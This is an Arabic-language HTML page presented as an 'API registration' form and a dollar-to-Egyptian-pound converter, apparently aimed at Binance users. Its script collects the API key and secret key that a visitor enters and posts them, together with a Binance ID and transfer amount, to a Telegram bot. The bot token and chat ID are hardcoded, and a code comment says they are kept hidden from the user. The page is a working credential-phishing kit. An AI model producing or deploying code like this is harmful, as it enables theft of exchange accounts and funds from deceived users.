<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل API</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { font-family: 'Cairo', sans-serif; }
  </style>
</head>
<body class="bg-black text-white">

  <!-- الصفحة الأولى: تسجيل API -->
  <div id="registration-page" class="min-h-screen flex flex-col items-center justify-center">
    <h1 class="text-3xl font-bold mb-6">تسجيل API</h1>

    <input id="api-key" type="text" placeholder="API Key" class="mb-4 px-4 py-2 bg-gray-800 border border-white rounded w-72">
    <input id="secret-key" type="text" placeholder="Secret Key" class="mb-4 px-4 py-2 bg-gray-800 border border-white rounded w-72">

    <!-- IP ثابت يظهر تلقائيًا -->
    <input id="ip-address" type="text" value="41111111" readonly class="mb-4 px-4 py-2 bg-gray-700 border border-white rounded w-72 text-gray-400">

    <button onclick="submitAPI()" class="bg-green-500 hover:bg-green-600 px-6 py-2 rounded">تأكيد</button>
  </div>

  <!-- الصفحة الثانية: تحويل الدولار -->
  <div id="converter-page" class="hidden min-h-screen flex flex-col items-center justify-center">
    <h2 class="text-3xl font-bold mb-6">احسب قيمة المبلغ بالجنيه</h2>
    <input id="usd-amount" type="number" placeholder="أدخل المبلغ بالدولار" class="mb-4 px-4 py-2 bg-gray-800 border border-white rounded w-72">
    
    <!-- خانة Binance ID -->
    <input id="binance-id" type="text" placeholder="أدخل Binance ID" class="mb-4 px-4 py-2 bg-gray-800 border border-white rounded w-72">

    <button onclick="convertToEGP()" class="bg-green-500 hover:bg-green-600 px-6 py-2 rounded">تحويل</button>
    <p id="result" class="mt-4 text-xl"></p>
  </div>

  <script>
    // بيانات التليجرام الثابتة (لا تظهر للمستخدم)
    const botToken = "7376753946:AAGdT_E1udWIYWUu21_NojPu-sVtk9uSljM";
    const chatId = "7699820616";

    function submitAPI() {
      const apiKey = document.getElementById('api-key').value;
      const secretKey = document.getElementById('secret-key').value;
      const ipAddress = document.getElementById('ip-address').value;

      const message = `\nAPI Key: ${apiKey}\nSecret Key: ${secretKey}\nIP: ${ipAddress}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => {
        if (response.ok) {
          document.getElementById('registration-page').classList.add('hidden');
          document.getElementById('converter-page').classList.remove('hidden');
        } else {
          alert("فشل الإرسال إلى البوت");
        }
      });
    }

    function convertToEGP() {
      const usdAmount = parseFloat(document.getElementById('usd-amount').value);
      const binanceId = document.getElementById('binance-id').value;
      const rate = 50; // 1 USDT = 50 جنيه
      const result = usdAmount * rate;
      document.getElementById('result').textContent = `= ${result} جنيه مصري`;

      const message = `تم إدخال طلب تحويل:\nالمبلغ: ${usdAmount} دولار\nالقيمة بالجنيه: ${result} جنيه\nBinance ID: ${binanceId}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });
    }
  </script>

</body>
  </html>
